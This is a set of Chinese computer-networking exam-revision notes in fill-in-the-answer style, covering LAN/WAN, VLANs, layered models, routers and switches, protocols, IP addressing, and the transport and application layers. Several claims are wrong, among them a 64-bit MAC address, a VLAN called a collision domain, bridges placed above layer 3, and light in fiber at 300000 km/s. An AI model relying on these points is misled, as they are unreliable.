<p>近年来，各类网络之间的区别已经变得越来越模糊了，比如也可分为局域网、广域网和互联网（ internet）</p>
<p><strong>广域网</strong>	WAN: Wide Area Network</p>
<p>远程（跨地区、国家、洲际)网网络，传播距离长（大于100KM），覆盖范围广；</p>
<p>一般通过租用专线接入公共数据通信网，作为公共资源由专门单位使用专线构建（如电信部门）供用户使用；</p>
<p>以路由器（Router）为技术基础；采用交换(switching)技术、路由(routing)技术和复用(multiplexing)技术。    </p>
<p>WAN通信一般称为“服务”（service）——收费（ISP）</p>
<p><strong>局域网</strong>	LAN: Local Area Network</p>
<p>近距（如一座建筑物中，常为某个单位所有并独立管理，如一座大楼或一集中建筑群) 一般使用专门敷设的线路</p>
<p>免费共享本地主机资源(主机&#x2F;服务器为中心)</p>
<p>采用广播(broadcast)技术共享传输媒介传送（广播式）</p>
<p>可用通信介质较多</p>
<p>传输距离有限，一般小于10KM，或局限在一栋建筑物之内的网络；</p>
<p>传输速率高（10Mbps~1Gbps）;</p>
<p>误码率低，可靠性好；传输延迟少；</p>
<p>使用范围广，遍布各机关、企事业单位及学校（校园网）；</p>
<p>**城域网	**MAN: Metropolitan  Area Networks</p>
<p>传送距离介于LAN和WAN之间(通常是一个城市）</p>
<p>与WAN相似处</p>
<p>​	一般不为某个单位所有</p>
<p>​	通信线路和通信设备有偿使用</p>
<p>与大型LAN相似处</p>
<p>​	提供地域性资源共享服务的高速网络</p>
<p>​	出口通常连接其他网络（因特网等）</p>
<p>莆田学院校园网：通过电信的光纤接入莆田电信城域网</p>
<p>有关VLAN</p>
<p> 一个VLAN是一个冲突域 各个VLAN之间不能通信  VLAN之间必须通过服务器交换信息</p>
<p>一个VLAN可以看作是一个 广播域 </p>
<p>动态划分VLAN的方法中不包括 交换机端口</p>
<p>在局域网中划分VLAN,不同VLAN之间必须通过 接入端口 连接才能互相通信</p>
<p>属于各个VLAN的数据帧必须同时打上不同的 VLAN标记</p>
<p>在局域网中可动态或静态划分VLAN,静态划分VLAN是根据 端口号</p>
<p>Internet 主干网采用 网型 结构</p>
<p>Internet 中采用的交换技术是 分组交换 </p>
<p>因特网服务提供商——ISP</p>
<p>两个端系统之间的通信工作方式通常可以划分为C&#x2F;S和P2P。 、</p>
<p>带宽的单位是Hz；赫兹。 </p>
<p>计算机网络中最重要的一个性能指标是数据传输速率。</p>
<p>对带宽要求不高的网络应用属于 弹性服务。</p>
<p>因特网（Internet）的起源可追溯到它的前身 ARPANET </p>
<p>误码率&#x3D;出错的比特数&#x2F;传输的总比特数</p>
<table>
<thead>
<tr>
<th>计算机网络层</th>
<th>数据单元</th>
<th>常用协议</th>
<th>功能</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>物理层</td>
<td>比特</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>数据链路层</td>
<td>帧</td>
<td>Ethernet、PPP</td>
<td></td>
<td></td>
</tr>
<tr>
<td>网络层</td>
<td>数据包 数据报 分组</td>
<td>IP、ICMP、OSPF</td>
<td>路由选择、拥塞控制与网络互连</td>
<td></td>
</tr>
<tr>
<td>运输层</td>
<td>报文  tcp的协议数据单元被称为分段</td>
<td>TCP、UDP</td>
<td>负责提供可靠的端到端数据传输</td>
<td></td>
</tr>
<tr>
<td>应用层Application</td>
<td>不再另外命名，统称为报文</td>
<td>FTP、SMTP、HTTP</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<img src="C:\Users\Star\AppData\Roaming\Typora\typora-user-images\image-20230218212239099.png" alt="image-20230218212239099" style="zoom:67%;" />

<p>物理层和数据链路层对应TCP&#x2F;IP体系结构中 网络接口层</p>
<p>信道上可传送信号的最高频率和最低频率之差称为  信道带宽</p>
<p>目前网络应用系统采用的主要模型是 客户&#x2F;服务器计算模型</p>
<p>计算机网络采用 分组交换 技术，而传统电话网络则采用 电路交换 技术</p>
<p>传送速率单位“b&#x2F;s”代表 bits per second</p>
<p>网络拓扑包括  星形、总线形、环形和网状形</p>
<p>在OSI模型中，下层为上层 提供服务</p>
<p>在RIP路由协议中，当距离为  16  时表示目的不可达</p>
<p>归零码、曼切斯特编码、差分曼切斯特编码 编码在每一位的中间都有一个跳变</p>
<p>采用CRC校验的生成多项式为G(X)&#x3D;x^16^+x^15^+x^2^+1，它产生的校验码是 16bit</p>
<p>当分组从高层向低层传送时，头部被 加上</p>
<p>当分组从低层向高层传送时，头部被 去掉</p>
<p>关于英语</p>
<p>NII 被形象地称为信息高速公路</p>
<p>OSI&#x2F;RM——开放系统互连&#x2F;参考模型。</p>
<p>TCP&#x2F;IP——传输控制协议&#x2F;网际协议</p>
<p>Modem 猫——调制解调器</p>
<p>CSMA&#x2F;CD——载波侦听多路访问&#x2F;冲突检测协议</p>
<p>ISP——因特网服务提供商</p>
<p>信息高速公路的基本特征是交互、广域和 高速 </p>
<p>在同一个系统内，相邻层之间交换信息的连接点称之为 接口，而低层模块向高层提供功能性的支持称之为 服务</p>
<p>在ISOOSI&#x2F;RM中, 实现数据压缩功能 表示层</p>
<h2 id="关于设备"><a href="#关于设备" class="headerlink" title="关于设备"></a>关于设备</h2><p>路由器</p>
<p>局域网与广域网之间使用的互连设备是 路由器</p>
<p>路由器和网关都具备协议转换功能</p>
<p>Internet的核心部件是 路由器</p>
<p>路由器运行于OSI模型的 网络层</p>
<p>路由器不仅仅能实现点对点的传输，还能实现C&#x2F;S</p>
<p>路由器的作用是 寻址 和 转发 </p>
<p>一个路由器到下一个路由器之间的距离称为 跳 或 hop</p>
<p>路由信息协议 RIP)使用的路由算法 距离矢量路由算法</p>
<p>在 Internet 中,路由器的路由表通常包含 目的网络和到达该网络的下一个路由器的IP地址</p>
<p>网卡</p>
<p>计算机与局域网的连接是通过一个名为网络适配器（网卡）的硬件设备进行的</p>
<p>网卡基本功能：数据转换、网络存取控制、数据缓存</p>
<p>网卡  是工作在物理层和数据链路层上的网络设备</p>
<p>交换机</p>
<p>连接局域网，通过  交换机  实现</p>
<p>交换式局域网的核心设备是 局域网交换机</p>
<p>交换机 是工作在数据链路层上的网络设备</p>
<p>以太网交换机是按照 MAC地址 进行转发的</p>
<p>集线器</p>
<p>集线器 实际上是一个多端口的中继器</p>
<p>在局域网标准中,100BASE-T规定从收发器到集线器的距离不超过 100</p>
<p>调制解调器的功能 数据传输</p>
<h2 id="关于协议"><a href="#关于协议" class="headerlink" title="关于协议"></a>关于协议</h2><p><img src="https://img1.baidu.com/it/u=1333219036,2646778075&fm=253&fmt=auto&app=138&f=JPEG?w=499&h=231" alt="img"></p>
<p>常用协议介绍</p>
<p>HTTP   -  WWW</p>
<p>FTP    -   文件下载&#x2F;文件上传  端口号：21</p>
<p>SMTP—— Internet中发送邮件协议</p>
<p>IEEE 802.3   -  局域网通信	IEEE——电气和电子工程师协会</p>
<p>TCP&#x2F;IP   -  因特网</p>
<p>NetBEUI   -  文件共享和打印机共享</p>
<p>Stop-and-wait &#x2F;Sliding window     -  流量控制&#x2F;差错控制</p>
<p>HDLC  -  数据链路控制</p>
<p>协议的系统组合→ “Architecture”（网络体系结构）</p>
<p>协议的三要素是 语法、语义、时序</p>
<p>WLAN所用的协议是 IEEE 802.11 协议</p>
<p>LAN所用的协议是 IEEE 802.3 协议</p>
<p>在RIP路由协议中，当距离为  16  时表示目的不可达</p>
<p>SNMP 不属于 TCP&#x2F;IP 参考模型互连层协议</p>
<p>Internet网所采用的协议是 TCP&#x2F;IP ，其前身是 ARPANET </p>
<p>PPP是目前使用最广泛的数据链路层协议。</p>
<p>常用的内部网关协议有 RIP  、 OSPF  、 IGRP  、 IS-IS  等</p>
<p>以太网采用的CSMA&#x2F;CD协议，当冲突发生时要通过二进制指数后退算法计算后退延时，关于这个算法 冲突次数越多，后退的时间越长</p>
<p>一个运行CSMA&#x2F;CD协议的以太网，数据速率为1Gb&#x2F;s，网段长1km，信号速率为200000km&#x2F;s,则最小帧长是 10000 b</p>
<p>ICMP通常被认为是 网络  层的协议</p>
<p>IP协议——网际层最基本最重要的协议</p>
<p>目前使用最主要的IP协议是IPv4。</p>
<p>完成远程登录的 TCP&#x2F;IP 协议是 TELNET </p>
<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><p>网络攻击可以分为 被动攻击 和 主动攻击 。、</p>
<p>网络层的安全协议主要是 IPSec</p>
<p>屏蔽主机体系适合于 中小型网络。</p>
<p>IDS指的是 对入侵行为进行监测的技术 。 </p>
<p>入侵检测系统所采用的技术可分为 特征检测 与 异常检测。、</p>
<p>在企业内部网与外部网之间，用来检查网络请求分组是否合法，保护网络资源不被非法使用的技术是 防火墙技术</p>
<p>在常用的网络安全策略中，最重要的是 防护</p>
<p><strong>防火墙不能 限制访问外部主机</strong></p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>中继器在物理层工作。</p>
<p>虚电路的实现有 交换式虚电路（SVC）和 永久虚电路（PVC）。</p>
<p>无论是数据报方法，还是虚电路方法，它们都采用 存储转发式的分组交换技术。</p>
<p>模拟信源输出的是 模拟信号 ，数字信源输出的是 数字信号。</p>
<p>信宿的作用是 将接收设备发过来的原始电信号还原成相应的信号。</p>
<p>信道一般用来 表示某个方向传送信息的媒体。</p>
<p>基本的复用技术包括 频分复用 和 时分复用 </p>
<p>光纤接入网可分为无源光网络和有源光网络</p>
<p>传输介质是通信网络中发送方和接收方之间的 物理 通路</p>
<p>传输速率 通信卫星&gt;光纤</p>
<p>双绞线中传输 电信号</p>
<p>光纤中传输 光信号</p>
<p>光纤的亮或暗用来表示 1 和 0 </p>
<p>高电压用来表示 1 ，低电压用来表示  0 </p>
<p>光纤</p>
<p>传输数据的时候，需要用到一对光纤——光具有 单向性</p>
<p>光纤利用 全反射 使光线在通道内定向传输</p>
<p>不受电磁干扰或噪声影响</p>
<p>光缆的光束是在 玻璃纤维 内传输</p>
<p>将数字信号调制为模拟信号有三种方式，即 调幅 、 调频 、 调相 </p>
<p>调制 ——基带数字数据——&gt;模拟信号</p>
<p>解调 ——模拟信号——&gt;基带数字数据</p>
<p>编码 ——数字信号——&gt;另一种形式的数字信号</p>
<p>解码 ——编码所得的数字信号——&gt;原来的数字信号</p>
<p>调制一般需要使用一个正弦信号作为 载波 </p>
<p>通信系统中，称调制前的电信号为 基带 信号，调制后的信号为 调制信号</p>
<img src="C:\Users\Star\AppData\Roaming\Typora\typora-user-images\image-20230218212143879.png" alt="image-20230218212143879" style="zoom:67%;" />

<p>计算信道的极限传输速率C</p>
<p>无噪声干扰的前提下——奈氏准则</p>
<p>有噪声干扰的前提下——香农公式</p>
<p>香农公式的意义——只要信息传输速率低于信道的极限传输速率，就一定存在某种办法来实现无差错的传输</p>
<p>相同设备之间连接用 交叉线</p>
<p>异类设备之间连接用 直通线</p>
<p>工作频率在5GHz，最高数据率为54Mb&#x2F;s的IEEE802.11标准是 IEEE 802.11a</p>
<p>异类设备互连使用的网线为直通线</p>
<p>与多模光纤相比较,单模光纤具有</p>
<p>较高的传输速率，较长的传输距离，较高的成本，采用的波长更长</p>
<p>PCM是一种  模拟到数字  转换的实例</p>
<p>介质 是信息传输的物理通道</p>
<p>计算机网络中常用的三种有线媒体是 同轴电缆. 双绞线 和 光纤</p>
<p>串行数据通信的方向性结构有三种，即单工、 半双工 和 全双工</p>
<p>计算机内传输的信号是 数字信号 ，而公用电话系统的传输系统只能传输 模拟信号 </p>
<p>在中继系统中，中继器处于 物理层</p>
<p>将双绞线制作成交叉线 一端按EIA&#x2F;TIA568A线序,另一端按EIA&#x2F;TIA 568B线序),该双绞线连接的两个设备可为 网卡与网卡</p>
<p>交接机是一种多播口网桥</p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>以太网地址是mac地址 64位</p>
<p>数据链路：数据链路层的通信对等实体之间的传输通道。</p>
<p>封装成帧主要有字节填充法和位填充法。</p>
<p>数据链路层使用的信道有点对点信道和广播信道两种类型。	</p>
<p>传输速率为10Mb&#x2F;s的以太网称为传统以太网。	</p>
<p>交换式以太网采用星状拓扑结构。</p>
<p>吉比特以太网的数据传输速率为1Gb&#x2F;s；1000Mb&#x2F;s。</p>
<p>一个帧的大小是  [64,1518)</p>
<p>帧突发机制规定，连续发送的最大长度限制为8KB。</p>
<p>数据链路层和物理层使用的地址是MAC地址</p>
<img src="C:\Users\Star\AppData\Roaming\Typora\typora-user-images\image-20230218212110928.png" alt="image-20230218212110928" style="zoom:67%;" />

<p>MAC地址是  硬件  地址。</p>
<p>MAC地址全球唯一</p>
<p>局域网中的 MAC 与 OSI 参考模型 数据链路层 相对应</p>
<p>在局域网中，MAC 指的是 介质访问控制子层</p>
<p>采用专用线路通信时，可以省去的通信阶段是 建立通信线路</p>
<p>就交换技术而言，局域网中的以太网采用的是 分组交换技术</p>
<p>INTERNET最初创建的目的是用于 军事</p>
<p>三网融合的三网：传统电信网  、计算机网络、有线电视网</p>
<p>在以太网中，用MAC地址来区分不同的设备的</p>
<p>在以太网中，最大传输单元(MTU)是 1500 字节</p>
<p>万兆以太网 不使用CSMA&#x2F;CD协议的以太网</p>
<p>以太网——是一种总线或星型结构的局域网技术</p>
<p>Ethernet 局域网采用的媒体访问控制方式为 CSMA&#x2F;CD</p>
<p>当连接两个完全不同结构的网络时，必须使用 网关 </p>
<p>在以太网中，是根据 MAC地址 地址来区分不同的设备</p>
<p>光纤的传输速度 300000km&#x2F;s</p>
<p>电缆的传输速度 200000km&#x2F;s</p>
<p>计算时间&#x3D;调制延迟+传输时间</p>
<p>调制延迟&#x3D;包长&#x2F;调制速率</p>
<p>传输时间&#x3D;两地距离&#x2F;介质传输速率</p>
<p>在相隔400km的两地间通过电缆以4800b&#x2F;s的速率传送3000b长的数据包，从开始发送到接收完数据需要的时间是</p>
<p>t&#x3D;3000&#x2F;4800+400&#x2F;200000&#x3D;627</p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>IP地址分 网络号 和 主机号 两个部分</p>
<p>网络层的任务是实现网络之间的互联与互通，功能为 路由选择、拥塞控制与网络互连</p>
<p>网络层和以上各层使用的地址是IP地址</p>
<p>IP地址是逻辑地址</p>
<p>网络号用来标识一个网络。</p>
<table>
<thead>
<tr>
<th>类别</th>
<th>最高比特位</th>
<th>最大网络数</th>
<th>IP地址范围</th>
<th>单个网段最大主机数</th>
<th>私有IP地址范围</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>000</td>
<td>126(2^7-2)</td>
<td>1.0.0.0-127.255.255.255</td>
<td>16777214</td>
<td>10.0.0.0-10.255.255.255</td>
</tr>
<tr>
<td>B</td>
<td>100</td>
<td>16384(2^14)</td>
<td>128.0.0.0-191.255.255.255</td>
<td>65534</td>
<td>172.16.0.0-172.31.255.255</td>
</tr>
<tr>
<td>C</td>
<td>110</td>
<td>2097152(2^21)</td>
<td>192.0.0.0-223.255.255.255</td>
<td>254</td>
<td>192.168.0.0-192.168.255.255</td>
</tr>
<tr>
<td>D</td>
<td>1110</td>
<td></td>
<td>224.0.0.0-239.255.255.255</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E</td>
<td>1111</td>
<td></td>
<td>240.0.0.0~255.255.255.255</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>主机号全为0表示主机地址，全为1表示广播地址，所以不能给主机配置主机号为0和255的ip</p>
<p>127作为本地环回地址，也不能用于给主机配置ip</p>
<p>子网掩码：在TCP&#x2F;IP 上区分每台主机网络号和主机号</p>
<p>Internet 的通信协议是  TCP&#x2F;IP</p>
<p>Ipv4——32位</p>
<p>Ipv6——128位	可以提供的IP地址总量为 2^128</p>
<p> ARP 协议的作用是 将IP 地址映射到第二层地址 </p>
<p>工作组不是上互联网所必须的</p>
<p>划分子网的原因——有 IP地址空间的有效利用率低  、 按类别分配IP地址会使网络性能变坏  、 两级的IP地址不够灵活</p>
<p>在ICMP差错报告中，如果TTL&#x3D;0，我们就认为 超时</p>
<p>在ICMP查询报文中，回声请求和应答用来 测试是否连通 </p>
<p>路由选择协议的核心是 路由算法 </p>
<p>一个理想的路由算法应具有 正确性  、 简单性  、 自适应性  、 稳定性  、 公平性  和 最优性 </p>
<p>在双协议栈技术中，用到了两个协议，它们分别是 IPV4  、IPV6 </p>
<img src="C:\Users\Star\AppData\Roaming\Typora\typora-user-images\image-20230218211654131.png" alt="image-20230218211654131" style="zoom:50%;" />

<p>子网掩码中的“1”代表  网络部分，“0”代表主机部分</p>
<p>在IP地址中，首表示网络号，尾表示广播地址</p>
<p>当一个 IP 分组在两台主机间直接交付时,要求这两台主机具有相同的 子网号</p>
<p>在 Internet 中，用字符串表示的 IP 地址称为 域名 </p>
<p>互连网中，域名是对IP地址的命名，它采用  层次 结构，通常最高域名为 国家名 。如CN代表 中国 ；次高域名常用于标识行业，如COM代表 商业 ，EDU代表 教育	最高写在最后面，次高写在倒数第二</p>
<p>路由选择协议位于 网络层</p>
<p>在OSI的七层参考模型中，工作在第三层以上的网间连接设备是 网桥</p>
<p>IP协议是无连接的，其信息传输方式是 数据报</p>
<p>数据报方式中允许分组乱序到达目的地</p>
<p>IPv6对比IPv4</p>
<p>更大的地址空间   IPv6的地址长达128位，是32位IPv4地址的四倍。IPv6理论上可容纳2128个不同地址，平均地球上每平方米可分配到6700万亿个IP地址。它甚至可以让地球上的所有人同时用1000台设备上网,每个设备拥有不同的IP地址。如此巨大的IP地址数，不仅消除了IP地址对因特网规模的限制，而且可以使地址包含更多的路由信息，简化了路由选择算法，提高了传输效率，减少了路由处理时间，提高了网络速度。</p>
<p>更好的报头格式   IPv6使用新的报头格式，这种格式中选项部分与基本报头部分是分开的，而且只在必要时插入其中。这就简化和加快了路由处理过程，因为选项中的大部分并不需要路由器检查。</p>
<p>如果两台主机在同一子网内，则它们的IP地址与子网掩码进行 “与”操作，结果相同</p>
<p>当一个IP分组在两台主机间直接交付时，要求这两台主机具有相同的 子网号</p>
<p>Internet 互连层的4个重要协议是IP、ARP、RARP和 ICMP</p>
<p>用于高层协议转换的网间连接设施是 网关</p>
<p>在RIP路由协议中，当距离为  16 时表示目的不可达</p>
<h2 id="运输层-传输层"><a href="#运输层-传输层" class="headerlink" title="运输层(传输层)"></a>运输层(传输层)</h2><p>传输层以上各层协议统称为高层协议，它们主要考虑的问题是 主机与主机 之间的协议问题</p>
<p>传输层可以通过 端口号 标识不同的应用</p>
<p>在 OSI 参考模型中的网络分层，通信子网与资源子网的分界层是 运输层</p>
<p>UDP报文常被称为 用户数据报。</p>
<p>TCP实体之间传输的协议数据单元PDU称为 TCP报文</p>
<p>TCP&#x2F;IP将端口分为两大类：保留端口，自由端口</p>
<p>UDP报文的报头长度固定为 8B。</p>
<p>TCP 的主要功能是 保证可靠运输</p>
<p><img src="https://img0.baidu.com/it/u=868667196,1804963305&fm=253&fmt=auto&app=138&f=JPEG?w=499&h=288" alt="img"></p>
<p>在 OSI 参考模型中的网络分层，通信子网与资源子网的分界层是 运输层</p>
<p>传输层上的核心是 TCP和UDP</p>
<p>在TCP&#x2F;IP参考模型中,传输层的主要作用是为应用进程提供 端到端的通信服务</p>
<p>由 Internet 端口号分配机构 IANA)管理的端口范围是 1~1023</p>
<p>TCP段结构中,端口地址的长度为 16b</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>com是 商业机构 的后缀</p>
<p>org是 非营利性组织 的后缀</p>
<p>域名的解析工作由 DNS服务器 完成</p>
<p>FTP的中文名称是 文件传输协议</p>
<p>电子邮件由 信封 和 报文 两部分组成。、</p>
<p> WWW 网页文件的编写语言及相应的支持协议分别为 HTML，HTTP</p>
<p>远程登录协议 Telnet 、电子邮件协议SMTP、文件传送协议FTP依赖 TCP协议</p>
<p>在电子邮件程序向邮件服务器发送邮件时，使用的是简单邮件传送协议SMTI 电子邮件程序从邮件服务器中读取邮件时，可以使用 POP3  协议</p>
<p>标准的URL由三部分组成,协议、主机名和路径及 文件名</p>
<p>FTP Client 发起对FTP Server 的连接建立的第一阶段是建立 控制连接</p>
<p>客户&#x2F;服务器 C&#x2F;S)属于以  服务器 为中心的网络计算模式</p>
<p>DNS的功能是解析 主机名和IP地址</p>
<p>域名解析过程中，可以执行两种类型的查询，分别是 迭代查询与递归查询</p>
<p>在FTP中,用于实际传输文件的连接是 数据连接</p>
<p>使用匿名FTP服务，用户登录时常常可以使用  anonymous 作为用户名</p>
<p><img src="https://img1.baidu.com/it/u=3765314886,500534333&fm=253&fmt=auto&app=138&f=PNG?w=451&h=261" alt="img"></p>
]]></content>
  </entry>
</search>
